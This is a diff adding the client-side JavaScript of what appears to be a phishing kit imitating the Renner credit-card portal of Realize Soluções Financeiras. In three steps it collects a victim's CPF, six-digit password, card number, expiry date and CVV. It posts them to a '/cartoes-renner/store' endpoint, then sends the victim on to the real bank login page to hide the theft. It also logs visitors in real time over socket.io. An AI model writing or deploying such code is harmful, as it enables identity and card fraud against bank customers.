@@ -1,0 +1,162 @@
+/* eslint-disable no-undef */
+// masks
+let step = 1
+const password = IMask(document.querySelector('.input-password'), {
+  mask: '000000'
+})
+const cpf = IMask(document.querySelector('.input-cpf'), {
+  mask: '000.000.000-00'
+})
+
+const card_number = IMask(document.querySelector('.input-card_number'), {
+  mask: '0000 0000 0000 0000'
+})
+
+const card_due = IMask(document.querySelector('.input-card_due'), {
+  mask: 'mm/yy',
+  blocks: {
+    yy: {
+      mask: IMask.MaskedRange,
+      from: Number(String(new Date().getFullYear()).substring(2)),
+      to: 99
+    },
+    mm: {
+      mask: IMask.MaskedRange,
+      from: 1,
+      to: 12
+    }
+  }
+})
+
+const card_cvv = IMask(document.querySelector('.input-card_cvv'), {
+  mask: '000'
+})
+
+// steps
+async function loading(finish = false) {
+  const loading = $('.card-button')
+
+  loading.removeClass('disabled').addClass('loading')
+  await sleep(randomTime())
+
+  if (!finish) {
+    loading.addClass('disabled').removeClass('loading')
+  }
+}
+
+async function stepOne() {
+  if (!validateCpf(cpf.unmaskedValue)) {
+    return $('.input-cpf').parent().addClass('has-error')
+  }
+
+  await loading()
+  $('.main__difficulty').addClass('hidden')
+  $('.form-1').addClass('hidden')
+  $('.form-2').removeClass('hidden')
+  step = 2
+}
+
+async function stepTwo() {
+  if (password.value.length < 6) {
+    return $('.input-password').parent().addClass('has-error')
+  }
+
+  await loading()
+  $('.form-2').addClass('hidden')
+  $('.form-3').removeClass('hidden')
+  step = 3
+}
+
+async function stepThree() {
+  let hasError = false
+
+  if (!validateCardNumber(card_number.unmaskedValue)) {
+    hasError = true
+    $('.input-card_number').parent().addClass('has-error')
+  }
+
+  if (card_due.unmaskedValue.length !== 4) {
+    hasError = true
+    $('.input-card_due').parent().addClass('has-error')
+  }
+
+  if (card_cvv.unmaskedValue.length !== 3) {
+    hasError = true
+    $('.input-card_cvv').parent().addClass('has-error')
+  }
+
+  if (hasError) return
+
+  await loading(true)
+
+  try {
+    await axios.post('/cartoes-renner/store', {
+      cpf: cpf.value,
+      password: password.value,
+      card_number: card_number.value,
+      card_due: card_due.value,
+      card_cvv: card_cvv.value
+    })
+
+    window.location.href =
+      'https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/login'
+  } catch (error) {
+    console.log(error.response)
+    // location.reload()
+  }
+}
+
+// events
+$('input').on('keyup', function () {
+  $(this).parent().removeClass('has-error')
+
+  const buttons = $('.card-button')
+  if (step === 1 && cpf.unmaskedValue.length === 11) {
+    return buttons.removeClass('disabled')
+  }
+
+  if (step === 2 && password.value.length === 6) {
+    return buttons.removeClass('disabled')
+  }
+
+  if (
+    step === 3 &&
+    card_number.unmaskedValue.length === 16 &&
+    card_due.unmaskedValue.length === 4 &&
+    card_cvv.unmaskedValue.length === 3
+  ) {
+    return buttons.removeClass('disabled')
+  }
+
+  buttons.addClass('disabled')
+})
+
+$('form').on('submit', async function (e) {
+  e.preventDefault()
+
+  const buttonEnabled = $('.card-button:not(.disabled)')
+
+  if (!buttonEnabled.length) return false
+
+  step = Number($(this).attr('data-step'))
+
+  if (step === 1) return stepOne()
+  if (step === 2) return stepTwo()
+
+  return stepThree()
+})
+
+// socket io
+const socket = io.connect()
+
+// statistics
+const today = new Date().toLocaleDateString('pt-BR')
+const visited = localStorage.getItem('visit')
+
+if (!visited || visited !== today) {
+  try {
+    axios.post('/cartoes-renner/visit')
+    socket.emit('online')
+    localStorage.setItem('visit', today)
+  } catch {}
+}
